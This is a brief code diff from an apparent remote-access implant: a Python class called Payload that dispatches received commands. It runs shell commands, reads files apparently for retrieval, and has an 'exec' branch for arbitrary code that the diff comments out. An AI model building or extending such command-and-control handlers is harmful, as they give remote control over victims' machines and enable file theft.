@@ -42,9 +42,9 @@ class Payload(object):
 		elif cmd['type'] == "sh":
 			cmd['res'] = utils.force_decode(utils.sh(cmd['cmd']))
 			return cmd
-		elif cmd['type'] == "exec":
-			exec(cmd['cmd'])
-			cmd['res'] = utils.b64e("exec'd".encode())
+		# elif cmd['type'] == "exec":
+		# 	exec(cmd['cmd'])
+		# 	cmd['res'] = utils.b64e("exec'd".encode())
 			return cmd
 		elif cmd['type'] == "dl":
 			fd = open(cmd['fn'],"rb").read()
